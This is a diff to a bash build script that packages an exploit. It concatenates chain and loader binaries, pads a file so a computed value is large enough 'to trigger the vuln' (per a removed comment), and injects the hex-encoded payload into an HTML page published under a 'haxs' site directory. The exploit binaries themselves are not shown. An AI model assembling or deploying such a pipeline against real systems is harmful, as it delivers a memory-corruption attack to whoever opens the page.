@@ -1,3 +1,5 @@
+#!/bin/bash
+
 rm -rf build site site.zip
 
 mkdir -p build
@@ -17,9 +19,8 @@ cd ..
 
 cat chain.bin loaderstub.bin loader.bin > final.bin
 
-#dd if=/dev/zero of=hax.bin bs=1 count=131072
 dd if=/dev/zero of=hax.bin bs=1 count=122456
-echo -e -n "\xFE\xAD\xBE\xEF" >> hax.bin # Force there to be stuff at the end so the computed decmial is large enough to trigger the vuln
+echo -e -n "\xFE\xAD\xBE\xEF" >> hax.bin
 dd if=final.bin of=hax.bin conv=notrunc
 
 gcc -g ../multi_tool.c -lgmp -o multi_tool
@@ -29,9 +30,10 @@ xxd -p hax.bin | tr -d '\n' > hax.ascii
 cp ../index.html .
 echo \\ >> output.bin
 sed -i '/INSERT_HERE/ {
-	r output.bin
-	d
+    r output.bin
+    d
 }' index.html
+
 mkdir -p ../site/haxs/
 cp index.html ../site/haxs/
 cp ../payload/payload.png ../site/haxs/
